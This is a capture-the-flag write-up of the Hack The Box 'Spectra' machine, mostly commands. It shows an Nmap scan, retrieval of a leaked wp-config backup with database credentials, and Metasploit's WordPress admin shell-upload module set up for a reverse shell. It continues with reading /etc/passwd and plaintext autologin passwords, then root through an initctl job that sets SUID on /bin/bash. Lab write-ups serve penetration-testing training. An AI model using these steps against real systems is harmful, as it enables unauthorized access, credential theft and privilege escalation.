
## Machine: Spectra
- Date: 2021.05.02
- Author: jak010

### Setup
- ExportIP: 10.10.10.229
- DNS
	- `sudo echo 10.10.10.229 spectra.htb >> /etc/hosts` 


### Nmap Scan
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 13:44 EDT
Nmap scan report for 10.10.10.229
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.94 seconds
```

### Gathering (interesting information)
- `http://spectra.htb/main/`
	- `User(interesting)` : administrator
	- `Word Press Site`


### Enumeration
- `http://spectra.htb/testing` -> `Directory Listing Able`
	- Configuration Leak
    ```sh
	$ curl -XGET spectra.htb/testing/wp-config.php.save
    ```
	- `Result`
		- DB_USER: devtest
		- DB_PASSWORD: devteam01

### Exploit && Gainig Shell
- Metasploit
	- Module
		- exploit/unix/webapp/wp_admin_shell_upload
	- Configure
        ```sh
		$ set rhost 10.10.10.229
		$ set username administrator
		$ set password devteam01
		$ set targeturi /main
		$ set lhost My_Ip
		$ set lport 4444
        ```

### Credential
- `cat /etc/passwd`
    ```text
	...
	katie:x:20156:20157::/home/katie:/bin/bash
    ```

### USER Escalate
- Process
    ```sh
	$ cd /opt
	$ cat autologin.conf.orig
	$ cd /etc/autologin
	$ cat passwd
    ```
	- `katie password`: `SummerHereWeCome!!`
- SSH Connection  
    ```sh
	$ ssh katie@10.10.10.229
	>> Password: SummerHereWeCome!!
    ```


### Priviliege Escalate
- Command
   ```sh
   $ sudo -l
   User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
   ```
   - Directory move: `cd /etc/init`
       ```text
       $ nano test.conf
       > script
       > chmod +s /bin/bash
       > end script
       ```
       - `sudo /sbin/initctl stop test`
       - `sudo /sbin/initctl start test`
   - `/bin/bash -p`







